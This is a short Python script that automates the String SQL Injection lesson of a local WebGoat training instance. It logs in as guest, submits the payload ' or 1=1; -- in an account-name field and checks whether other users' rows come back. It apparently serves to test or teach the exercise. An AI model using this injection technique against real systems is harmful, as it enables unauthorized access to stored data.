import requests
import sys

prox = {
	'http' : '127.0.0.1:8000'
}

login = {
	'username' : 'guest',
	'password' : 'guest'
}

# this var is changeable
name = '\' or 1=1; --'

injection = {
	'account_name' : name,
	'submit' : 'Go!'
}
url1 = 'http://127.0.0.1:8080/WebGoat/login.mvc'
url2 = 'http://127.0.0.1:8080/WebGoat/j_spring_security_check'
url3 = 'http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc'

flag = 0
s = requests.Session()
r1 = s.post(url2, data=login, proxies = prox)
r2 = s.get(url3, proxies = prox)

spl = r2.text.split("String SQL Injection")
string = spl[1]
index = string.find("Screen=")
num = string[index + 7: index + 11]

url4 = 'http://127.0.0.1:8080/WebGoat/attack?Screen=' + num + '&menu=1100'
url5 = 'http://127.0.0.1:8080/WebGoat/service/restartlesson.mvc'

r3 = s.get(url4, proxies = prox)
r4 = s.post(url4, data=injection, proxies=prox)

spl = r4.text.split("<tr>")
index = 2
# print name + "\n"

while index < len(spl):
	tr = spl[index]
	inner_spl = tr.split("<td>")
	inner_str = inner_spl[3]
	# print str(index) + " " + inner_str
	if inner_str[0 : inner_str.find("</td>")] != name:
		flag = 1
		break
	index = index + 1

r5 = s.get(url5, proxies=prox)

if flag != 0:
	print "Attack Successful"
	sys.exit(1)
else:
	print "Attack Unsuccessful"
	sys.exit(0)










